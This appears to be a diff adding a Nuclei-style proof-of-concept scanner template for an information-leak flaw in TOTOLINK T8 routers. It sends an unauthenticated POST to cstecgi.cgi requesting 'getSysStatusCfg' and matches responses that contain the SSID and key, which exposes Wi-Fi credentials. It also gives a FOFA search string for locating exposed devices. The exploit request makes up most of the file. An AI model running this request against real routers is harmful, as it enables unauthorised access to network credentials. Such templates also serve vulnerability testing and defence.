@@ -1,0 +1,66 @@
+id: poc-rx6tf6asz3vh6bmn
+info:
+  name: totolink T8 设置 cstecgi.cgi getSysStatusCfg 信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rx6tf6asz3vh6bmn'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rx6tf6asz3vh6bmn
+    fofa: title="TOTOLINK"
+http:
+- raw:
+  - 'POST /cgi-bin/cstecgi.cgi HTTP/1.1
+
+
+    Accept:application/json,text/javascript，*/*;q=0.01
+
+
+    X-Requested-with: XMLHttpRequest
+
+
+    Content-Type: application/x-www-form-urlencoded:charset=UTF-8
+
+
+    Accept-Encoding:gzip,deflate
+
+
+    Accept-Language:zh-Tw,zh:g=0.9.en-US:g=0.8.en:g=0.7
+
+
+    Connection:close
+
+
+
+
+    {
+
+
+    "topicurl":"getSysStatusCfg",
+
+
+    "token":""
+
+
+    }
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?ssid)(?=.*?key).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
